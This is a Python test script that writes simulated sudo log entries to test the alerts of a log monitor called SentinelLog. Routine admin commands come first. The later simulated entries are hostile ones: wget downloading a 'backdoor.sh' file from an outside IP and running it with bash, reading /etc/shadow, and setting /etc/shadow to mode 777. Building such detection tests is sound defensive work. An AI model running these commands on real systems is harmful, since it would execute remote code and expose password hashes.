"""
SentinelLog privilege-escalation simulation (sudo log type).

Writes a realistic incident to a sudo-style log — normal, boring admin
work from trusted users, then an unexpected account running sudo, then
a couple of genuinely dangerous commands (reverse shell staging, reading
/etc/shadow, a wide-open chmod). Each unique user/command pair fires its
own alert, so this deliberately triggers more than once.

Usage:
    python simulate_privilege_escalation.py                      # writes to sudo.log
    python simulate_privilege_escalation.py C:\\path\\to\\file.log  # writes to a specific file

Remember to select "Sudo / Privilege" as the log type on the New Monitor
page before starting the session.
"""
import sys
import time
from datetime import datetime, timedelta

target = sys.argv[1] if len(sys.argv) > 1 else "sudo.log"

def line(dt, user, command):
    ts = dt.strftime('%b %d %H:%M:%S')
    return f"{ts} webserver sudo:   {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}"

now = datetime.now()
events = []
_t = [now]
def next_time(seconds):
    _t[0] = _t[0] + timedelta(seconds=seconds)
    return _t[0]

# ── Phase 1: normal admin work from trusted accounts — should NOT alert ──
events.append((line(next_time(0), "ibrahim", "/usr/bin/apt update"), 1.0))
events.append((line(next_time(2), "root", "/usr/bin/systemctl restart nginx"), 1.0))
events.append((line(next_time(2), "deploy", "/usr/bin/systemctl status app.service"), 1.0))

# ── Phase 2: an account nobody recognizes shows up and runs sudo at all —
#    fires on "unexpected user" alone, regardless of the command.
events.append((line(next_time(3), "www-data", "/usr/bin/whoami"), 1.5))

# ── Phase 3: genuinely dangerous commands — each fires its own alert,
#    matching SUSPICIOUS_COMMANDS (wget, /bin/bash, /etc/shadow, chmod).
#    Each gets its own second so alert IDs never collide.
events.append((line(next_time(2), "guest", "/usr/bin/wget http://45.155.205.90/backdoor.sh -O /tmp/.x"), 1.5))
events.append((line(next_time(2), "guest", "/bin/bash /tmp/.x"), 1.5))
events.append((line(next_time(2), "ibrahim", "/bin/cat /etc/shadow"), 1.5))
events.append((line(next_time(2), "www-data", "/usr/bin/chmod 777 /etc/shadow"), 1.5))

print(f"Writing to: {target}\n")
with open(target, "a", encoding="utf-8") as f:
    for text, delay in events:
        f.write(text + "\n")
        f.flush()
        print(f"  {text}")
        time.sleep(delay)

print(f"\nDone. {len(events)} lines written to {target}")
print("Expect: alerts for www-data (unexpected user), guest running wget + bash,")
print("ibrahim reading /etc/shadow, and www-data chmod-ing /etc/shadow.")
print("The first 3 lines (ibrahim/root/deploy doing routine admin work) should NOT alert.")
